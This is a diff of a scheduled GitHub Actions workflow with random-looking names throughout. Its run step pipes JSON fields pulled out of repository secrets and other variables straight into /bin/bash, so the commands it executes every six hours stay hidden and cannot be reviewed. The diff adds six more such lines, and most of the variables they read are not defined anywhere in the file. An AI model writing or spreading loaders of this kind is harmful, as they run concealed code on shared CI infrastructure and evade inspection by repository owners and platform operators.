@@ -1,20 +1,26 @@
 name: qianlisong2b
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
+    - cron: '6 4/6 * * *'
 
-jobs:  # 21146
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qianlisong2b
         env:
-          slvh033: ${{ secrets.slvh033 }}
+          cseao10: ${{ secrets.cseao10 }}
         run: |
-          echo $slvh033 | jq -r .dxopf42 | /bin/bash
-          echo $jqqh176 | jq -r .yj0581 | /bin/bash
-          echo $vjsya1253 | jq -r .p98 | /bin/bash
+          echo $cseao10 | jq -r .uyuuc2280 | /bin/bash
+          echo $jmucg3924 | jq -r .wmos1 | /bin/bash
+          echo $i19977 | jq -r .uoux1 | /bin/bash
+          echo $dbt95624 | jq -r .yydx60 | /bin/bash
+          echo $prq361 | jq -r .zeon1 | /bin/bash
+          echo $wor3 | jq -r .o19813 | /bin/bash
+          echo $mni47 | jq -r .m11 | /bin/bash
+          echo $ey32 | jq -r .xpggk12283 | /bin/bash
+          echo $v34 | jq -r .ajhpf6598 | /bin/bash
 
